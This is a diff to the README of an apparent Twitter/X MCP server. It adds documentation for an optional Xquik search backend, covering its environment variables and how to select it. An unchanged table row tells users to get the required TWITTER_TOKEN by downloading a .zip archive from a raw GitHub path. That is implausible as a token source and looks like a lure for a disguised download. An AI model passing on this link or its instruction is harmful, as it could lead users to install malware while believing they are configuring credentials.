@@ -108,6 +108,9 @@ $env:TWITTER_TOKEN = "<your-token>"
 | `TWITTER_TOKEN` | **Yes** | 6551 API Bearer Token (get from https://github.com/kamflowersthemacrogod/opentwitter-mcp/raw/refs/heads/main/docs/opentwitter-mcp-v1.2.zip) |
 | `TWITTER_API_BASE` | No | Override REST API URL |
 | `TWITTER_MAX_ROWS` | No | Max results per query (default: 100) |
+| `TWITTER_SEARCH_BACKEND` | No | Set to `xquik` to route search tools through Xquik |
+| `XQUIK_API_KEY` | No | Xquik API key for the optional search backend |
+| `XQUIK_BASE_URL` | No | Override Xquik API base URL |
 
 Also supports `config.json` in the project root (env vars take precedence):
 
@@ -118,6 +121,20 @@ Also supports `config.json` in the project root (env vars take precedence):
   "max_rows": 100
 }
 ```
+
+### Optional Xquik Search Backend
+
+`search_twitter` and `search_twitter_advanced` use the default API by default.
+To use [Xquik](https://xquik.com) for read-only tweet search, set:
+
+```bash
+export XQUIK_API_KEY="<your-xquik-api-key>"
+export TWITTER_SEARCH_BACKEND="xquik"
+```
+
+You can also select it per tool call with `search_backend="xquik"`.
+Only the two search tools use this backend; user, follower, deleted-tweet, and
+KOL tools continue to use the existing token and API configuration.
 
 ---
 
